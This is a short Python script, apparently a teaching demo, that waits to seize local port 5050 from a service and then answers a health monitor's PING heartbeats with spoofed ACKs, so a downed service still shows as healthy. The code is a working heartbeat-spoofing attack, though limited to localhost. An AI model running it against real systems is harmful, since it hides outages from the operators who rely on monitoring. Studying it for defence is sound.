import socket
from datetime import datetime

HOST = "127.0.0.1"  #local host addr
PORT = 5050   


def timestamp():
    return datetime.now().strftime("%H:%M:%S")  # hours minutes seconds


def main():
    print(  # msg showing we're waiting for an opportunity to take over target port
        f"[{timestamp()}] Adversarial started waiting to hijack port {PORT}..."
    )

    #allows script to bind to port w/o waiting for OS to fully clear socket state after a crash
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attacker:
        attacker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while True: # infinite loop to try n bind to port 5050
            try:
                attacker.bind((HOST, PORT))
                break
            except OSError: # throw err cuz port still occupied by the running service
                continue #retry 
        #exit loop when successful n print msg
        attacker.listen()
        print(f"[{timestamp()}] SUCCESS: Port {PORT} hijacked. Spoofing heartbeats...")


    #infinite loop so attacker keeps listening (intercept) for new connection attempts repeatedly
        while True:
            #accept() pauses until a client connects, then returns that client socket and address
            client_socket, client_address = attacker.accept()
            with client_socket:
                #reads up to 1024 bytes of incoming data sent by monitor
                incoming_data = client_socket.recv(1024).decode("utf-8").strip()
                print(f"[{timestamp()}] received ping from monitor: {incoming_data}...")
                if incoming_data.upper() == "PING":  #check if incoming msg is the hearbeat; heartbeat = PING
                    # Send fake ACK response back to keep monitor reporting 'green'
                    client_socket.sendall(b"ACK\n")
                    print( f"[{timestamp()}] Sent spoofed ACK -> Monitor fooled (SERVICE DOWN!)")


if __name__ == "__main__":
    main()


'''
sources:
https://docs.python.org/3/howto/sockets.html
https://www.datacamp.com/tutorial/a-complete-guide-to-socket-programming-in-python
https://www.youtube.com/watch?v=WNcqf0OOlUE
https://realpython.com/python-sockets/
https://www.geeksforgeeks.org/python/socket-programming-python/

'''